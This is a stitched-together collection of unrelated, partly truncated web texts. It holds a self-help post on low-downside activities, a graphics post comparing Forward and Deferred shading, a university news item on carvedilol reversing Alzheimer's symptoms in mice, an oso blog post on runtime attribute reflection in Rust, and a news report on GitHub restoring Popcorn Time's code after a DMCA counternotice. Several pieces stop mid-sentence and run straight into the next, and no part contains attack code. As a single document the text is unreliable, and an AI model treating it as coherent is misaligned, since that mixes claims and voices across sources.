<p>Alright I know I used this example from <em>Shoe Dog</em> already, but Phil Knight partnering with Bill Bowerman was the decision that created Nike. And it happened because Bowerman made the (zero-risk) decision to simply <em>ask</em> Phil Knight if he could join Blue Ribbon. He ended up owning 49% of the company that would become Nike, and (if <em>Shoe Dog</em> is to be believed) got to just hang out at his house and mess around with waffle irons.</p>

<h3>Meeting people</h3>

<p>Meeting new people can be uncomfortable, but that's pretty much the only downside. The upside, however, is virtually limitless: you could meet your future life partner, your future business partner, your best friend, your key investor, your biggest client, etc. Sow lots of seeds, and some of them will become sequoias.</p>

<h4>Go to meetups</h4>

<p>It's easier to talk to strangers when you all have <em>something</em> to talk about—and what are meetups but groups of people getting together to talk about <strong>one</strong> thing? Go to a variety of meetups, both to maximize your chances of meeting people but also to <a href="#learning">learn</a> more stuff!</p>

<h4>Join a sports team</h4>

<p>Sports seem to breed camaraderie, so joining a sports team can be the fastest way to pick up some new friends. Plus it counts as <a href="#exercise">exercise experimentation</a>, so that's two birds with one stone.</p>

<h4>Volunteer</h4>

<p>Putting a bunch of people in a room and saying "okay go be friends now" generally doesn't work—you need some kind of activity to bond over. And volunteering is a <em>great</em> bonding activity. You've more-or-less filtered out all the assholes (who generally don't volunteer) and volunteers are generally in an open, friend-making mood. Plus you end up learning about something (political campaigns, homeless programs, environmental cleanup) that you probably had no prior experience with (see <a href="#learning">learning</a>).</p>

<h3>Organize something</h3>

<p><img src="https://cringle.io/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBMZz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--6a1b64312afd28c3a881b201237f50203c3a0087/image-1601846549934.jpg" alt="Benjamin Franklin"></p>

<p>Benjamin Franklin organized the first American fire department, the first American library, and the first American philosophical society. He was an organizing machine, and it propelled him to great heights. If you find yourself saying "wouldn't if be nice if there was..." just <em>organize</em> it!</p>

<h2>Creative</h2>

<h3>Writing a blog post</h3>

<p>Yeah okay it's a bit on the nose but blog post-writing has some very asymmetric payoffs. The cost of writing one is fixed and relatively small, but the impact can sometimes be <em>huge</em>. My post on <a href="https://tjcx.me/posts/i-wasted-40k-on-a-fantastic-startup-idea/">losing \$40K</a> still gets thousands of hits a day, and it took a few hours to write. Sure, many of your posts will be read by zero people, but occasionally <em>thousands</em> of people will read one, which could lead to <a href="#meeting-people">meeting new people</a>, new business, or exposure to <a href="#learning">new ideas</a>.</p>

<h3>Tweeting</h3>

<p>This has the same benefits of writing a blog post, but with far less overhead (and arguably the same payoff profile). I'm just not very good at limiting myself to 280 characters.</p>

<h3>Creating a product</h3>

<p>Creating a product can also have outsize returns. It's not always worthwhile (the initial investment could be quite high) but launching the right product or business could change your life.</p>

<h2>Learning</h2>

<p>The only downside to learning new things is the <em>time</em> you spend doing it—but the upside is enormous.</p>

<h3>Reading (the right) books</h3>

<p>We can read faster than we can listen (to podcasts) or watch (videos)—so if <em>learning</em> is a convex activity, then reading books will provide the best bang for your buck. And <em>within</em> the book category there are two subcategories that will get you even better payoffs.</p>

<h4>Very old books</h4>

<p>Old books are good because</p>

<ol>
<li>They're <a href="https://en.wikipedia.org/wiki/Lindy_effect"><strong>Lindy</strong></a>: a book that has survived centuries must have some good (or at least thought-provoking) ideas</li>
<li>They're <strong>unpopular</strong>: old books are rarely on bestseller lists, which means the information they provide will be more likely to give you a novel idea (pun intended).</li>
</ol>

<h4>Very specialized books</h4>

<p>Specialized books are good because</p>

<ol>
<li>Deep knowledge in a certain area tends to produce innovations</li>
<li>Again, they're <strong>unpopular</strong>: you'll likely stumble across something that few others have</li>
</ol>

<h3>Experimenting</h3>

<p>Experimentation usually involves ratcheting: we can ignore bad results but build on good results. This means that the downside is low (almost zero) but the upside (if you discover something immensely important) is huge.</p>

<p>Below are some examples of things we can <em>all</em> experiment with, but keep an eye out for other opportunities to run experiments.</p>

<h4>Diet</h4>

<p>Having a good diet makes you more confident, more energetic, and generally better at taking on the world. There is a <em>lot</em> of conflicting diet advice out there, but the costs of self-experimentation are pretty low—so just try some stuff!</p>

<p>In the worst case you'll get a stomach ache, but in the best case you'll dramatically improve your health!</p>

<h4>Exercise</h4>

<p><img src="https://cringle.io/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBMdz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ccd9c25d7a82d94c8b6a749d0589aa36fc4e112f/image-1601846572078.gif" alt="Corgi exercise"></p>

<p>This is pretty similar to the above section: experimenting with different forms of exercise isn't hard—but the benefits of finding a type of exercise that works for your body, your schedule, and your preferences can considerably improve your life.</p>

<h4>Routine</h4>

<p>We are our habits. Life isn't about one or two momentous decisions, it's about the little things we do consistently, every day. A corollary is that <em>modifying</em> these habits can lead to massive long-term changes in our lives.</p>

<p>You could argue that the payoff function for habits is in fact <em>symmetric</em>: developing bad habits is bad in the same way that developing good habits is good. But—like a lot of things in this list—careful experimentation can limit the downside (you can stop if things start looking bad) but keep the massive upside. So beware of developing bad habits!</p>

<h3>Switching jobs</h3>

<p>I don't think I've ever talked to somone who <em>regretted</em> switching jobs. Randall Munroe agrees:</p>

<h4>Switching roles</h4>

<p>Switching roles (i.e. careers) is usually easier if you do it at your current company, and the downsides are often smaller than people think. Generally speaking, companies will let you transition <em>back</em> to your old role, or transition again to another role.</p>

<p>Transitioning roles give you upside in the form of</p>

                  <section>
              <p>So… this is a highly discussed topic these days. Many engines already do Deferred Shading. Doom 2016 decided to go Forward at 60 FPS with 1080p, thus making popular that&nbsp;big AAA titles with high demands can do Forward just fine (although it’s not the first nor only AAA title that uses Forward. Forza Horizon 2 for example). VR also tends to like forward because of the lower bandwidth costs at high resolution +&nbsp;MSAA.</p>
<p>However, I feel there’s a lot not being covered in regular discussions. Having implemented both, I want to describe the strengths and weaknesses of each other.</p>
<p><strong>Note:</strong>&nbsp;When I say “Forward” in this post, I’m referring to any of the modern variations that allow efficiently rendering lots of lights in forward shading&nbsp;methods: Tiled Forward, Clustered Forward, Forward+, Forward+ 2.5, Forward3D. They’re all variations of the same thing. I will not be referring to “Forward” as the old technique&nbsp;of keeping a per-draw fixed-length array of lights that was common in the 90’s and 2000’s, most commonly but not always limited to 8 lights per draw.</p>

<h3>What everyone tells you about Forward vs Deferred:</h3>
<h4>Pros of Forward:</h4>
<ol>
<li>Works with MSAA</li>
<li>Works with transparency</li>
<li>Allows using multiple BRDFs</li>
</ol>
<h4>Cons of Forward:</h4>
<ol>
<li>Often requires a Z pre-pass (not always, depends on implementation and trade offs)</li>
<li>Pixel quad occupancy problems for tiny triangles</li>
<li>Performance more dependent on complexity of scene</li>
<li>The “good” modern algorithms require compute shaders, which can be a problem if DX10-level hardware is being targeted.</li>
</ol>
<h4>Pros of Deferred:</h4>
<ol>
<li>Performance&nbsp;depends more on screen resolution than scene complexity.</li>
<li>Lots of resources online on how to implement one.</li>
<li>Works on really old hardware, including mobile.</li>
<li>Impact of tiny triangles is lower.</li>
<li>Mobile extensions can optimize bandwidth consumption a lot by keeping passes in on-chip memory.</li>
</ol>
<h4>Const of Deferred:</h4>
<ol>
<li>Antialising is <em>hard</em>.</li>
<li>Transparency is really hard. Better revert to using Forward for those.</li>
<li>Poor support for multiple BRDFs.</li>
<li>Consumes A LOT of bandwidth. (though there are <a href="https://forum.beyond3d.com/threads/modern-textureless-deferred-rendering-techniques.57611/">modern variations that reduce&nbsp;bandwidth consumption</a>, but they only work on modern&nbsp;GPUs)</li>
<li>You’re lucky if you get those mobile extensions for using on-chip memory to work in shipped devices other than your own. Yes, Vulkan supports subpasses&nbsp;as a core feature, but again… you’re lucky if you find many Android devices supporting Vulkan. The market share right now is minuscule. There’s still GLES2-only Android devices being manufactured in 2016!</li>
</ol>
<p>Both Deferred and Forward have the motto that “one big light == many small lights” due to fillrate/computation behavior.</p>

<h3>What is rarely talked about</h3>
<p>This is where I wanted to get to. If we look at the pros and cons I just listed, which are listed everywhere, modern Forward has huge pluses. As in, huuuge pluses. MSAA + transparency + multiple BRDFs + low bandwidth??? Count me in!!!</p>
<p>So… what’s that catch?</p>

<h4>One huge mega-shader</h4>
<p>The first problem that pops up is that everything gets mashed up into one big pixel shader. The same pixel shader has to do:</p>
<ol>
<li>Directional’s shadow mapping (often selecting splits or doing fancy things to get pretty looking shadows).</li>
<li>Shadow mapping for any other light (spot and/or point)</li>
<li>Normal mapping (TBN matrix operations)</li>
<li>Sampling all textures (albedo, specular/metalness, roughness)</li>
<li>Detail map compositing (if more than one diffuse texture is used)</li>
<li>Iterate through the cluster for point lights.</li>
<li>Iterate through the cluster for&nbsp;spot lights.</li>
</ol>
<p>This results in horrible VGPR/SGPR register usage, which results in horrible occupancy and thus hinder the ability of the GPU to hide latency of memory reads and other stalls. Deferred shading has the advantage of being able to do more passes in smaller shaders that do one operation each (at the expense of more bw consumption for each pass).</p>
<p>Deferred gives us better control on the ratio&nbsp;of shader_passes / shader_size aka how many operations we&nbsp;cram into the same shader before writing a new one.</p>

<h4>Dependency problems</h4>
<p>The first thing that comes to mind is SSAO. Ideally SSAO needs to be applied to <em>only</em> the ambient lighting term. The thing is, to compute SSAO you need access to the depth buffer. But you don’t have the depth buffer until you’ve done your forward pass. So you’re in a Catch-22 problem:</p>
<ul>
<li>You need the forward pass to finish in order to compute SSAO.</li>
<li>You need SSAO to apply the AO to the ambient lighting term to do the forward pass.</li>
</ul>
<p>To solve this problem you have two solutions:</p>
<ol>
<li>Perform a depth pre-pass</li>
<li>Apply SSAO to the whole thing, ignoring correctness. Perhaps you can use the alpha channel to indicate how much % of the pixel has been lit by ambient, as a fake approximate. Or other tricks. But it would be a fake. Let’s remember that AO is already a fake (it has no real world physical basis), making SSAO the fake of a fake. Such tricks add up to faking the fake of a fake. Not nice. But maybe you make it look good.</li>
</ol>
<p>Deferred doesn’t have this problem at all,&nbsp;as the depth is available&nbsp;before the shading pass.</p>

<h4>SSR (Screen Space Reflections)</h4>
<p>Technically this is a subset of the “Dependency problems” like the SSAO problem described above, but since SSR are all the rave now, it deserves its own section.</p>
<p>SSR has a similar dependency problem:</p>
<ul>
<li>You need to know how the shaded&nbsp;result is going to look (you need depth,&nbsp;normals from G-Buffer + shaded result) to compute SSR.</li>
<li>You need SSR to render&nbsp;the final result.</li>
</ul>
<p>Deferred Shading doesn’t have this problem because it can compute the shaded&nbsp;result, then do reflections, then combine them because it has all the necessary data in the G-Buffers to do a correct&nbsp;merge.</p>
<p>In forward to solve this problem you have three options:</p>
<!-- WP QUADS Content Ad Plugin v. 2.0.15 -->


<ol>
<li>Do what <a href="http://www.adriancourreges.com/blog/2016/09/09/doom-2016-graphics-study/">Doom 2016</a> does. Hybrid rendering (Deferred + Forward): perform a depth pre-pass with a small GBuffer (you need at least normals + depth, maybe roughness depending on how you compute glossy reflections), and&nbsp;use the final result of the previous frame (re-projected). Reflections will&nbsp;lag behind one frame. Also this inter-frame dependency doesn’t play nice with SLI/Crossfire.</li>
<li>Output&nbsp;a full blown GBuffer&nbsp;so you can later correctly merge reflections with the final output. This puts&nbsp;Forward in the “high bandwidth cost” category. Also MSAA gets harder to support. You’re essentially bringing in some of the Deferred’s cons.</li>
<li>Like with&nbsp;SSAO, don’t care about correctness and merge the output with the reflections in whatever way you can.</li>
</ol>


<h3>All points to hybrid rendering via a depth prepass</h3>
<p>Depth prepass seems to be the solution to everything:</p>
<ol>
<li>By having the depth earlier, you can compute SSAO.</li>
<li>Early&nbsp;depth&nbsp;helps with the mega-shader problem as every fragment&nbsp;will only be shaded once.</li>
<li>You can compute scene’s shadow mapping in a deferred way, then apply it as a mask during&nbsp;the forward shading result; thus offloading&nbsp;the mega-shader and reducing its size. Doing this mask&nbsp;<em>during</em> the depth prepass may be useful in AMD GPUs who have all those GCN cores idle. Maybe even compute some lights.</li>
<li>You can use Doom’s solution to SSR (if you can sustain 60 fps)</li>
<li>If you’re not careful, one of these solutions can hinder your ability to use&nbsp;MSAA.</li>
</ol>
<p>But of course… depth prepass is not free. It costs both CPU (batch generation and command preparation/execution) and GPU (the more tessellated your geometry is, the worse it gets). Furthermore, if you’re an experienced veteran with access to modern API techniques (e.g. GL’s AZDO, D3D11, D3D12, Vulkan) writing a new engine then depth prepass gets cheaper CPU-side&nbsp;as your engine will be very efficient with low driver overhead and multi-threaded command preparation. If you’re not an experienced programmer, or if you’re working with an engine with giant amounts of legacy, an extra&nbsp;pass can be very expensive.</p>
<p>As for the depth prepass itself, you also have two choices:</p>
<ol>
<li>While doing the depth prepass, output a small GBuffer &amp; do some offloading from&nbsp;the mega-shader (e.g. by computing the shadow mask). This means the depth prepass must split batches by materials in the same way the main forward pass will do. CPU side this is great because now commands can be reused entirely except for the ones that set the shader. Just change the commands that change the shader and you’re done. But this may result in heavier driver computations and more chance of pipeline stalls in the GPU.</li>
<li>Perform a depth prepass. No pixel shader, only depth output. CPU side you will have to create commands twice, but allows to batch a lot more (basically almost everything can be batched together). GPU side this is great because nearly no pipeline stalls will happen. Though load balancing may be an issue in GCN thus you’ll need&nbsp;some async compute to compensate.</li>
</ol>
<p>Which one is better? I don’t know. I have yet to try &amp; profile. But since option #2 doesn’t allow hybrid rendering I’ll likely won’t be even trying&nbsp;it.</p>

<h3>Other options</h3>
<p>I won’t go into detail because I don’t have experience with these techniques. A GPU-Open post talks about <a href="http://gpuopen.com/texel-shading/">texel shading</a>&nbsp;and Oxide Games’ presentation talks about (the poorly-chosen-name) <a href="http://oxidegames.com/wp-content/uploads/2016/03/Object-Space-Lighting-Rev-21.pptx">Object Space Shading</a>. These techniques fight the drawbacks discussed here, but the texel shading article has a pretty good explanation of their own set of drawbacks.</p>

<h3>Final words</h3>
<p>Phew! I got this out of my chest.</p>
<p>Forward + big mega-shaders (which will get you&nbsp;GPU performance problems) vs Forward + depth prepass (and potentially MSAA issues) vs Deferred rendering with transparency, MSAA, and bandwidth issues.&nbsp;<strong>Pick your poison</strong>.</p>
<p>I’m a huge fan of modern Forward algorithms. I love being able to use MSAA and having no problems with transparency.</p>
<p>But unfortunately, <strong>I don’t see any clear winner as a general case algorithm</strong>.</p>
<p>If you can foresee you will have low tessellated geometry with expensive pixel shaders, go for Forward + depth prepass. If you have&nbsp;low or moderately tessellated geometry w/&nbsp;cheaper pixel shaders (e.g. non-photorealistic rendering, don’t care about perfect reflections or “correct” SSAO) just go Forward. If you can foresee you’ll …</p></section></article></div>

                                                                                        <p><span><span>A research team at the University of Calgary’s <a href="https://cumming.ucalgary.ca/">Cumming School of Medicine</a> (CSM) led by Dr. S.R. Wayne Chen, PhD, has made an exciting breakthrough with the potential to prevent and reverse the effects of Alzheimer’s disease.</span></span></p>

<p><span><span>The team discovered that limiting the open time of a channel called the ryanodine receptor, which acts like a gateway to cells located in the heart and brain, reverses and prevents progression of Alzheimer’s disease in animal models. They also identified a drug that interrupts the disease process.</span></span></p>

<p><span><span>The effect of giving the drug to animal models was remarkable: After one month of treatment, the memory loss and cognitive impairments in these models disappeared. </span></span></p>

<p><span><span>“The significance of identifying a clinically used drug that acts on a defined target to provide anti-Alzheimer’s disease benefits can’t be overstated,” says Chen, a member of the <a href="https://libin.ucalgary.ca/">Libin Cardiovascular Institute</a> and the <a href="https://hbi.ucalgary.ca/">Hotchkiss Brain Institute</a> at the CSM.&nbsp;</span></span><span lang="EN-US"><span><span><span>Dr. Jinjing Yao, PhD, a student of Chen, is the first author of the study.</span></span></span></span></p>

<p><span><span>The results of this groundbreaking study were recently published in the peer-reviewed journal, <a href="https://www.cell.com/cell-reports/fulltext/S2211-1247(20)31158-X"><em>Cell Reports</em></a>.&nbsp;</span></span></p>

<p><span><span>This work is potentially highly impactful as more than half a million Canadians live with Alzheimer’s disease and other dementias, suffering memory loss and other cognitive impairments with a negative impact on quality of life. </span></span></p>

<h3><strong><span><span><span><span>The science behind the findings</span></span></span></span></strong></h3>

<p><span><span>Previous research has shown that the progression of Alzheimer’s disease is driven by a vicious cycle of the protein amyloid β (Aβ) inducing hyperactivity at the neuron level. However, the mechanism behind this wasn’t fully understood nor were there effective treatments to stop the cycle. &nbsp;</span></span></p>

<p><span><span>Chen’s team used a portion of an existing drug used for heart patients, carvedilol, to treat mice models with Alzheimer’s symptoms. After a month of treatment, researchers tested animal models with very promising results. </span></span></p>

<p><span><span>“We treated them for a month and the effect was quite amazing,” says Chen, explaining the drug was successful in reversing major symptoms of Alzheimer’s disease. “We couldn’t tell the drug-treated disease models and the healthy models apart.” </span></span></p>

<p><span><span>Chen, a Clarivate Highly Cited Researcher, is optimistic about the future of this research, noting the next step will be clinical trials in people.</span></span></p>

<p><em><span><span>Wayne Chen is a professor in the Department&nbsp;of Physiology and Pharmacology, Biochemistry and </span></span><span><span>Molecular Biology at the CSM.&nbsp;</span></span></em><span><span><em><span lang="EN-US"><span><span>Led by the&nbsp;</span></span></span></em><a href="http://www.hbi.ucalgary.ca/"><em><span><span><span><span><span>Hotchkiss Brain Institute</span></span></span></span></span></em></a><em><span lang="EN-US"><span><span>,&nbsp;</span></span></span></em><a href="http://www.ucalgary.ca/research/brain-and-mental-health"><em><span><span><span><span><span>Brain and Mental Health</span></span></span></span></span></em></a><em><span lang="EN-US"><span><span>&nbsp;is one of six research strategies guiding the University of Calgary toward its&nbsp;Eyes High&nbsp;goals.

October 25, 2020 | https://www.osohq.com/post/runtime-reflection-pt-2 | <a href="https://web.archive.org/web/*/https://www.osohq.com/post/runtime-reflection-pt-2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
<h2>Introduction</h2>
<p>This is Part 2 in our blog series on our experience building a runtime reflection system in Rust for our policy engine, oso. </p>
<p>In Part 1, we built a simple class system, with a metaclass struct called <code>Class</code> to track type information. We also introduced the <code>Instance</code> struct to wrap any object and erase the type using <code>dyn Any</code>. You can find Part 1: dyn Class <a href="https://www.osohq.com/post/rust-reflection-pt-1">here</a>. </p>
<p>In this post, we'll go through how we support accessing arbitrary attributes on our instances at runtime. There are multiple approaches to solving this problem, including the use of traits from the standard library and commonly used crates like <code>serde</code>. We'll talk through the pros and cons of each, and the version we landed on: adding attribute getters.</p>
<h2>Accessing attributes on a struct</h2>
<p>Suppose we have a struct:</p>
<pre><code>struct Foo {
    x: u32,
}
</code></pre>

<p>We would like to write the following code in <a href="https://docs.osohq.com/using/polar-syntax.html">Polar</a>, the oso Policy language:</p>
<pre><code>x_is_one(foo: Foo) if
    foo.x = 1;
</code></pre>

<p>and have it check that <code>foo</code> has an attribute called <code>x</code> and that its value is 1.</p>
<h3>What makes this so hard?</h3>
<p>To start with, there is no <code>getattr(foo, "x")</code> equivalent in Rust. And what makes this hard to implement ourselves is that Rust (by default) provides no guarantees about things like <a href="https://doc.rust-lang.org/reference/type-layout.html#the-default-representation">the memory layout of a struct</a>. In fact, in some cases will simply <a href="https://doc.rust-lang.org/nightly/nomicon/exotic-sizes.html#zero-sized-types-zsts">optimise away the field entirely</a>. Even in debug builds, a debugger might be unable to <a href="https://github.com/rust-lang/rust/issues/46698">lookup the value of variables</a>.</p>
<p>In other words, if you haven't <em>explicitly</em> told Rust that you want it to let you access an attribute, you're unlikely to get it.</p>
<h2>Our approach</h2>
<p>Let's start by thinking about the method signature for dynamic access. We would like to take in an <code>Instance</code> and an attribute name (<code>&amp;str</code>), and return a value to the policy engine.</p>
<p>In other words:</p>
<pre><code>Fn(&amp;Instance, &amp;str) -&gt; PolarValue;
</code></pre>

<p>There are actually two distinct places we could conceivably implement this method: on <code>Instance</code>, and in <code>Class</code>.</p>
<p>On one hand, if we implement it directly on <code>Instance</code>, then we don't need to do any more work to look up the class in order to get attributes.</p>
<p>On the other hand, we need to store the attributes <em>somewhere</em> so that we can add them to the instance on creation. So we would probably need to store these these on the <code>Class</code> anyway, and then copy them onto the <code>Instance</code>.</p>
<p>It's a subtle distinction, but for us it made more sense to the keep the instance lightweight, and to use the <code>Class</code> to store the attribute lookups. Although in Python its perfectly valid to add attributes to a class on the fly, we have that requirement in neither the host language nor in Polar.</p>
<p>To make the above work, we simply add a method on an <code>Instance</code> to retrieve the class of it, and we can get attributes from there:</p>
<pre><code>impl Instance {
    fn get_class(&amp;self) -&gt; Result&lt;&amp;Class&gt; { ... }

    pub fn get_attribute(&amp;self, name: &amp;str, host: &amp;mut Host) -&gt; crate::Result&lt;Term&gt; {
        let class = self.class(host)?
        class.get_attribute(self, name)
    }
}
</code></pre>

<h3>Implementing the getter</h3>
<p>To implement the <code>get_attribute</code> method, we can either implement (a) a method that can fetch <em>all</em> attributes, or (b) a method for each attribute.</p>
<p>We opted for (b), which gives us the most flexibility to decide on a per-attribute basis how the lookup works.  <code>Class</code> stores a map from attribute names to getters:</p>
<pre><code>/// Class definitions
struct Class {
   ...

    /// Map from attribute name to the attribute lookup
    attributes: HashMap&lt;&amp;'static str, AttributeGetter&gt;
}

struct AttributeGetter(Arc&lt;dyn Fn(&amp;Instance) -&gt; PolarValue);
</code></pre>

<p>We've now split the attribute lookup into two steps:</p>
<ol>
<li>Look up the getter for the named attribute: <code>(instance, name) → (instance, attributes.get(name)) → (instance, f)</code></li>
<li>Apply the getter method: <code>(instance, f) → f(instance)</code></li>
</ol>
<p>A simple example of an attribute getter is the closure <code>|foo: &amp;Foo| foo.x</code> which has <a href="https://doc.rust-lang.org/reference/types/closure.html">a unique anonymous type</a> – written <code>[closure@&lt;source code location&gt;]</code>   —  and implements the trait <code>Fn(&amp;Foo) -&gt; R</code>. </p>
<p>To store this on the class we need to do some dynamic type mapping again. First, we have in our hands an <code>Instance</code>, not a <code>Foo</code>. We saw in the last post that <code>downcast</code> would allow us to get back to a concrete type. Furthermore we cannot store a function that returns <whatever the="" type="" of="" <code="">foo.x is&gt;. Instead, we make sure to do the conversion back to a <code>PolarValue</code> as part of looking up the attribute.</whatever></p>
<p>To make it a bit easier to create such type-erased functions, and to make it easier for users of oso, the <code>AttributeGetter</code> provides a new method which handles this for them:</p>
<pre><code>impl AttributeGetter {
    pub fn new&lt;T, F, R&gt;(f: F) -&gt; Self
    where
        T: 'static,
        F: Fn(&amp;T) -&gt; R,
        R: crate::ToPolar,
    {
        Self(Arc::new(move |receiver: &amp;Instance, host: &amp;mut Host| {
            // get back the original type of the receiver
            let receiver = reveiver.downcast().expect("type error");
            // call the function; convert the result
            f(receiver).map(|res| res.to_polar(host))
        }))
    }
}
</code></pre>

<p>We use this in the builder method:</p>
<pre><code>impl&lt;T: 'static&gt; ClassBuilder&lt;T&gt; {
  pub fn add_attribute_getter&lt;F, R&gt;(mut self, name: &amp;'static str, f: F) -&gt; Self
    where
        F: Fn(&amp;T) -&gt; R,
        R: crate::ToPolar,
    {
        self.attributes.insert(name, AttributeGetter::new(f));
        self
    }
}
</code></pre>

<p>One nice property of the above is that it's a compile-time error to define an attribute getter for the wrong class! So despite erasing the type when constructing an <code>Instance</code> and later recovering the type dynamically, it's impossible to provide the wrong getter:</p>
<pre><code>error[E0631]: type mismatch in closure arguments
  --&gt; languages/rust/oso/examples/blog.rs:53:14
   |
53 |             .add_attribute_getter("y", |foo: &amp;Bar| foo.y)
   |              ^^^^^^^^^^^^^^^^^^^^      ----------------- found signature of `for&lt;'r&gt; fn(&amp;'r example_two::Bar) -&gt; _`
   |              |
   |              expected signature of `for&lt;'r&gt; fn(&amp;'r example_two::Foo) -&gt; _`
</code></pre>

<h3>Trying it out</h3>
<p>Okay, let's see it in action! We'll start with some test setup:</p>
<pre><code>struct Foo { x: u32, }

#[test]
fn test_get_attribute() {
    // Setup the host environment
    let polar = crate::Polar::new();
    let mut host = Host::new(Arc::new(polar));

   ...
}
</code></pre>

<p>Now that we're a runtime class system, we need something to manage these classes at runtime. This is our <code>Host</code> object. <code>Host</code> will be responsible for things like storing class definitions and caching instances. </p>
<p>Next, we define the <code>Foo</code> class:</p>
<pre><code>// builder for defining the Foo class
let foo_class: Class = Class::builder::&lt;Foo&gt;()
    .add_attribute_getter("x", |foo| foo.x)
    .build();
// register the Foo class on the host
host.cache_class(foo_class, "Foo".into()).unwrap();
</code></pre>

<p>We added a simple builder pattern to make it easier to register attributes in bulk, and the built <code>Class</code> is cached on the <code>host</code>.</p>
<p>With the setup done, we can try out accessing attributes dynamically:</p>
<pre><code>let foo_instance: Instance = Instance::new(Foo { x: 1 });
// get the value of "x" from the instance
let get_x = foo_instance.get_attribute("x", &amp;mut host).unwrap();

// check the result is the PolarValue for 1
assert_eq!(get_x, polar_core::term!(1));
</code></pre>

<p>The test looks up the value of "x" on the instance of foo, and compares it to the expected result. Dynamic attributes in action! The returned value is now a Polar term, since in normal operation the return value would be sent to the Polar VM.</p>
<p>The benefit of this approach is it gives the user a lot of optionality: for cases where the attribute doesn't implement <code>ToPolar</code>, we can handle conversions right in the closure defined. And the implementation itself is super simple.</p>
<p>The main downside of the approach is that it is <em>very</em> manual. For every attribute a user wants to use, they need to add the <code>add_attribute_getter</code> line.</p>
<p>Fortunately, in the <code>oso</code> crate, we also provide a derive macro which can handle this. We still make getting attributes an opt-in process, but the code from above becomes:</p>
<pre><code>#[derive(PolarClass)]
struct Foo { 
    #[polar(attribute)]
    x: u32,
}

#[test]
fn test_get_attribute() {
    ...

    // builder for defining the Foo class
    let foo_class: Class = Foo::get_polar_class();

    ...
}
</code></pre>

<h2>Alternate Approaches</h2>
<p>The approach we outline above suits our needs, but is leveraging virtually nothing from the Rust standard library nor the Rust ecosystem. Is there really nothing out there to address this problem?</p>
<p>We'll take you through a few of the alternatives we tried. Some of them are complementary to the approach we've taken and would be reasonable future additions, others just didn't quite seem to be what we needed.</p>
<p>In no particular order:</p>
<h3>Implement <code>Index&lt;String&gt;</code></h3>
<p>In some ways, the most direct route we could take would be to use the <code>Index&lt;String&gt;</code> <a href="https://doc.rust-lang.org/std/ops/trait.Index.html">trait</a>. This is normally used for data structures like <code>Vec,</code> which allow you to index into it with <code>vec[i]</code>, or with <code>HashMap</code>, which allows you to get a key with <code>map[&amp;key]</code>.</p>
<p>The benefit of using a trait from the standard library is that users may get implementations of the trait for "free", e.g., if they are already using a <code>HashMap</code>, then they don't need to do any additional work to define attribute getters that leverage the trait.</p>
<pre><code>impl ClassBuilder&lt;T&gt; {
    fn supports_indexing(mut self) -&gt; Self
    where T: Index&lt;&amp;str&gt;
    {
        self.set_attribute_lookup(|receiver, attr| {
            receiver.index(&amp;attr)
        }
    }
}
</code></pre>

<p>The problem is: what is the output type for <code>Index</code>? We need it to be any type that can be converted back into the Polar core –&nbsp;perhaps <code>Box&lt;dyn ToPolar&gt;</code> or similar. To make that happen, we would be requiring the user to implement a version of <code>Index</code> for their classes, which is unlikely to be something they will want in the rest of their code. Given this, it doesn't seem like there is much benefit to using <code>Index</code>.</p>
<h3><code>serde::Serialize</code></h3>
<p>Whenever we encounter a problem that requires some form of translation, <code>serde</code> comes to mind. </p>
<p>We could require types to implement <code>serde::Serialize</code>. By writing our own custom serializer, this would give us a way to leverage the existing machinery for walking over all the fields of a struct. And the ubiquity of …</p></div></div></div>

			<p>For more than half a decade, Popcorn Time has been a thorn in the side of Hollywood. </p>
<p>The ‘Netflix for Pirates’ offers an easy-to-use application that opens the door to a library of thousands of streamable movies and TV-shows. </p>
<p>The Motion Picture Asociation (MPA) recognized this threat early on and pressured the original developers to throw in the towel. That worked, but it came too late as the open-source project was swiftly revived by others.</p>
<p>Today, Popcorn Time lives on through many project forks. The most popular is PopcornTime.app, which like its predecessor, <a href="https://github.com/popcorn-official" target="_blank">shares its source code publicly</a> on the developer hosting platform GitHub. This allows others to download, modify, and share it. </p>
<p>The MPA is not happy with this and took action recently. The movie industry group <a href="https://torrentfreak.com/mpa-suggests-github-could-be-held-liable-for-popcorn-times-copyright-infringements-200505/" target="_blank">informed GitHub</a>, which is owned by Microsoft, about the infringing nature of the software. According to the MPA, the application includes links to pirate sites, pirate APIs, and pirate torrent trackers, which are used to download pirated movies and TV-shows.</p>
<center><img src="https://torrentfreak.com/images/mparequest.jpg" alt="" width="500" height="354" srcset="https://passivetech.com/wp-content/uploads/2020/05/cd1cc7f20aa83c5321df90abe40fe86c.jpg 625w, https://torrentfreak.com/images/mparequest-600x424.jpg 600w" sizes="(max-width: 500px) 100vw, 500px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20500%20354'%3E%3C/svg%3E" data-lazy-srcset="https://passivetech.com/wp-content/uploads/2020/05/cd1cc7f20aa83c5321df90abe40fe86c.jpg 625w, https://torrentfreak.com/images/mparequest-600x424.jpg 600w" data-lazy-src="https://torrentfreak.com/images/mparequest.jpg"></center>
<p>On top of that, the MPA suggested that GitHub itself may be liable for copyright infringement if the company fails to take action. </p>
<p>While the MPA’s interpretation of the law is likely not shared by GitHub, the company did remove the Popcorn Time code. In most cases that would be the end of the story, but Popcorn Time was not backing off without a fight. </p>
<p>The developers submitted a DMCA counternotice explaining that the MPA’s request is not legitimate. The code is owned by Popcorn Time, not the MPA, and Popcorn Time asked GitHub to restore access. </p>
<p>“The code is 100 % ours and do not contain any copyright [sic] material please check again,” the <a href="https://github.com/github/dmca/blob/d7f4a6a3aade92999d4d86962972c4b27af820e3/2020/05/2020-05-04-MPA-counternotice.md" target="_blank">developer wrote</a>.</p>
<p>The app’s developers made a good point here. The identified code (not the built app) is not directly copyright infringing and it contains no direct links to copyright-infringing material either. This means that a DMCA notice may not be the right tool here.</p>
<p>Faced with both requests, GitHub has now decided to restore full access to the Popcorn Time repository. </p>
<p>This decision doesn’t necessarily mean that it agrees with the app developers, however. The DMCA simply prescribes that, following a counternotice, content can be restored after two weeks, unless the claiming party files a lawsuit. </p>
